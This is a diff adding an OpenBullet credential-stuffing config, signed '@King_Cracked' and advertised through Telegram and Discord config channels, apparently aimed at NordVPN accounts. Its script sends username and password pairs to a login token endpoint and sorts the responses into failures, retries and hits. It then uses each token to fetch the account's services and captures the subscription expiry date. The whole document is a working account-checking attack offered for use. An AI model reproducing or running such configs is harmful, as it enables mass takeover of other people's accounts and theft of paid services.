@@ -1,0 +1,90 @@
+[SETTINGS]
+{
+  "Name": "Nord Vpn by @King_Cracked",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2022-06-15T18:48:19.790746+00:00",
+  "AdditionalInfo": "DISCOD https://discord.gg/6XBbYgPR  /TELEGRAM : https://t.me/Config_list  /https://t.me/OPEN_BUILLET_Configs",
+  "Author": "@King_Cracked",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#get REQUEST POST "https://zwyr157wwiu6eior.com/v1/users/tokens" 
+  CONTENT "username=<USER>&password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#ch KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Failure OR 
+    KEY "\"message\":\"Invalid password\"}}" 
+    KEY "Invalid username\"" 
+  KEYCHAIN Retry OR 
+    KEY "502: Bad gateway" 
+
+#TK PARSE "<SOURCE>" LR "\"token\":\"" "\"" -> VAR "TOKEN" 
+
+#TK2 FUNCTION Base64Encode "token:<TOKEN>" -> VAR "TOKENS" 
+
+#POST REQUEST GET "https://zwyr157wwiu6eior.com/v1/users/services" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Authorization: Basic <TOKENS>" 
+
+#KEY KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "created_at" 
+  KEYCHAIN Failure OR 
+    KEY "[]" 
+    KEY "invalid password" 
+
+#EXP PARSE "<SOURCE>" LR "\",\"expires_at\":\"" " " CreateEmpty=FALSE -> CAP "EXP" 
+
+#EXP2 FUNCTION RegexMatch "...." "<EXP>" -> VAR "Expire" 
+
+#@LOVER_WQ FUNCTION Constant "@King_Cracked" -> CAP "Config by" 
+
